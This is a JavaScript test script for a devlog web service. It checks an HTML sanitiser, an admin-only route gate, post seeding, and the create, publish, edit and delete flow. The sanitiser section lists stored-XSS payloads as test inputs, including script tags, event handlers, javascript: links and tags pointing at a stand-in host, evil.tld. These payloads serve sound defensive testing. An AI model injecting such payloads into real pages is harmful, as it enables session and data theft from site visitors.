// ============================================================
// Devlog service — the gate and the sanitiser, against a real schema.
//
// Two things here are security-relevant rather than merely functional,
// and both are the kind that look fine until they don't:
//
//   1. The admin gate. Every write route must be invisible to a
//      non-admin session, including one that is perfectly valid.
//   2. The sanitiser. Post bodies are rendered with innerHTML on a
//      public marketing page. They used to be compile-time constants,
//      which made that safe; now they come from a database, which makes
//      it a stored-XSS question.
//
// Run: npm run sim:devlog
// ============================================================

import { SimD1 } from './d1.mjs';
import { MIGRATIONS } from '../worker/_migrations_bundle.js';
import { sanitizeHtml, routes } from '../worker/devlog.js';

let bad = 0;
function check(label, cond, detail = '') {
  if (cond) { console.log(`PASS  ${label}`); return; }
  bad += 1;
  console.log(`FAIL  ${label}`);
  if (detail) console.log(`        ${detail}`);
}

const DB = new SimD1(':memory:');
DB.applyMigrations(MIGRATIONS);
const env = { DB };

const ADMIN = { user_id: 'u_admin', email: 'lorne@bigtickets.com' };
const PLAYER = { user_id: 'u_player', email: 'someone@example.com' };

async function call(method, path, session, body) {
  for (const r of routes) {
    if (r.method !== method) continue;
    const params = typeof r.pattern === 'string'
      ? (r.pattern === path ? {} : null)
      : (path.match(r.pattern)?.groups ?? (path.match(r.pattern) ? {} : null));
    if (params === null) continue;
    const res = await r.handle(
      { json: async () => body, headers: new Map() },
      env,
      { url: new URL(`https://x${path}`), session, params },
    );
    return { status: res.status, body: JSON.parse(await res.text()) };
  }
  throw new Error(`no route for ${method} ${path}`);
}

// ------------------------------------------------------------------
// 1. THE SANITISER
// ------------------------------------------------------------------
const attacks = [
  ['a bare script tag', '<script>alert(1)</script>', 'alert'],
  ['a script with attributes', '<script src="//evil.tld/x.js"></script>', 'evil'],
  ['an unclosed script', '<p>hi</p><script>fetch("//evil.tld")', 'evil'],
  ['an event handler', '<p onclick="steal()">text</p>', 'onclick'],
  ['an image error handler', '<img src=x onerror="alert(1)">', 'onerror'],
  ['an iframe', '<iframe src="//evil.tld"></iframe>', 'iframe'],
  ['a javascript: link', '<a href="javascript:alert(1)">click</a>', 'javascript:'],
  ['inline styles', '<p style="position:fixed;top:0">covering</p>', 'position:fixed'],
  ['a style block', '<style>body{display:none}</style>', 'display:none'],
  ['an svg payload', '<svg><script>alert(1)</script></svg>', 'alert'],
  ['a form', '<form action="//evil.tld"><input name="p"></form>', 'evil'],
  ['a comment-hidden payload', '<!--<script>alert(1)</script>-->', 'alert'],
];
for (const [label, input, needle] of attacks) {
  const out = sanitizeHtml(input);
  check(`sanitiser strips ${label}`, !out.toLowerCase().includes(needle.toLowerCase()),
    `${JSON.stringify(input)} -> ${JSON.stringify(out)}`);
}

// It must not be so aggressive that it eats the posts we actually have.
const real = '<h2>Heading</h2><p>Body with <strong>bold</strong> and <em>italics</em>.</p>'
  + '<ul><li>one</li><li>two</li></ul>'
  + '<div class="cl-tablewrap"><table class="cl-table"><tr><th>A</th><td>1</td></tr></table></div>';
const kept = sanitizeHtml(real);
for (const frag of ['<h2>', '<strong>', '<li>', '<table class="cl-table">', '<div class="cl-tablewrap">']) {
  check(`sanitiser keeps ${frag}`, kept.includes(frag), kept.slice(0, 200));
}
check('sanitiser drops an unknown class rather than passing it through',
  !sanitizeHtml('<div class="evil-overlay">x</div>').includes('evil-overlay'));

// ------------------------------------------------------------------
// 2. THE ADMIN GATE
// ------------------------------------------------------------------
const asPlayer = await call('GET', '/api/admin/devlog', PLAYER);
check('a signed-in NON-admin cannot list posts', asPlayer.status === 404,
  JSON.stringify(asPlayer));
const asNobody = await call('GET', '/api/admin/devlog', null);
check('an unauthenticated caller cannot list posts', asNobody.status === 404);
const writeAttempt = await call('POST', '/api/admin/devlog', PLAYER,
  { slug: 'x', title: 'X', html: '<p>x</p>' });
check('a non-admin cannot create a post', writeAttempt.status === 404,
  JSON.stringify(writeAttempt));
// 404, not 403: an admin surface should not confirm it exists.
check('...and is told 404, not 403 — the surface does not announce itself',
  writeAttempt.body?.error?.code === 'not_found');

// ------------------------------------------------------------------
// 3. SEEDING + THE PUBLIC READ
// ------------------------------------------------------------------
const pub0 = await call('GET', '/api/devlog', null);
check('the public read seeds an empty table with the authored posts',
  (pub0.body.posts ?? []).length === 2, JSON.stringify((pub0.body.posts ?? []).map(p => p.slug)));
check('...newest first', pub0.body.posts?.[0]?.slug === 'rendezvous-and-routes',
  JSON.stringify((pub0.body.posts ?? []).map(p => p.slug)));
check('...and the Game 3 post keeps its charts flag',
  pub0.body.posts?.find(p => p.slug === 'game-3')?.charts === true);

// Seeding must not run twice — every request calls it.
await call('GET', '/api/devlog', null);
await call('GET', '/api/devlog', null);
const pub1 = await call('GET', '/api/devlog', null);
check('re-reading does not duplicate the seed', (pub1.body.posts ?? []).length === 2,
  JSON.stringify((pub1.body.posts ?? []).map(p => p.slug)));

// ------------------------------------------------------------------
// 4. THE EDITING LOOP
// ------------------------------------------------------------------
const created = await call('POST', '/api/admin/devlog', ADMIN, {
  slug: 'new-post', title: 'A New Post', date: 'today',
  lede: 'lede', html: '<p>hello</p><script>alert(1)</script>',
});
check('an admin can create a post', created.status === 200 && !!created.body.post?.id,
  JSON.stringify(created).slice(0, 200));
check('a new post is a DRAFT — writing is not publishing',
  created.body.post?.published === false, JSON.stringify(created.body.post));
check('the body is sanitised ON THE WAY IN, not on the way out',
  !String(created.body.post?.html ?? '').includes('alert'),
  JSON.stringify(created.body.post?.html));

const pubDraft = await call('GET', '/api/devlog', null);
check('a draft is invisible to the public read',
  !(pubDraft.body.posts ?? []).some(p => p.slug === 'new-post'),
  JSON.stringify((pubDraft.body.posts ?? []).map(p => p.slug)));

const id = created.body.post.id;
const published = await call('PATCH', `/api/admin/devlog/${id}`, ADMIN, { published: true });
check('publishing works', published.body.post?.published === true);
const pubLive = await call('GET', '/api/devlog', null);
check('...and the post appears publicly', (pubLive.body.posts ?? []).some(p => p.slug === 'new-post'));

const dupe = await call('POST', '/api/admin/devlog', ADMIN, {
  slug: 'new-post', title: 'Clash', html: '<p>x</p>',
});
check('a duplicate slug is refused — old links must not land on the wrong post',
  dupe.status === 409, JSON.stringify(dupe).slice(0, 160));

const badSlug = await call('POST', '/api/admin/devlog', ADMIN, {
  slug: 'Not A Slug!', title: 'X', html: '<p>x</p>',
});
check('a malformed slug is refused', badSlug.status === 400, JSON.stringify(badSlug).slice(0, 160));

// A partial edit must not blank the fields it did not mention.
const partial = await call('PATCH', `/api/admin/devlog/${id}`, ADMIN, { title: 'Renamed' });
check('a partial edit leaves untouched fields alone',
  partial.body.post?.title === 'Renamed' && partial.body.post?.lede === 'lede',
  JSON.stringify(partial.body.post));

const gone = await call('DELETE', `/api/admin/devlog/${id}`, ADMIN);
check('an admin can delete a post', gone.status === 200);
const after = await call('GET', '/api/devlog', null);
check('...and it leaves the public page', !(after.body.posts ?? []).some(p => p.slug === 'new-post'));
check('...without taking the seeded posts with it', (after.body.posts ?? []).length === 2);

console.log(bad === 0 ? '\nALL PASS' : `\n${bad} FAILURE(S)`);
process.exit(bad === 0 ? 0 : 1);
